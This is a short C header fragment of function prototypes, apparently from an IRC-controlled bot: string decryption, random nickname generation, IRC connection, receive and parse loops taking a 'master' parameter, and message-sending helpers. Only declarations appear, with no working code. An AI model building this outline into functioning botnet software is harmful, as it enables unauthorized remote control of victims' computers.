 char * decryptstr(char *str, int strlen);
 //void addlog(char *desc);
 int addalias(char *name, char *command);
 DWORD WINAPI irc_connect(LPVOID param);
 char * rndnick(char *strbuf);
 //int irc_receiveloop(SOCKET sock, char *channel, char *chanpass, char *nick1, char *server, BYTE spy);
  int irc_receiveloop(SOCKET sock, char *channel, char *chanpass, char *nick1, char *server);
 int irc_parseline(char *line, SOCKET sock, char *channel, char *chanpass, char *nick1, char *server, char *master, char *host, int *in_channel, int repeat);

 void irc_send(SOCKET sock, char *msg);
 void irc_sendf(SOCKET sock, char *msg, char *str);
 void irc_sendf2(SOCKET sock, char *msg, char *str, char *str2);
 void irc_privmsg(SOCKET sock, char *dest, char *msg, BOOL notice);
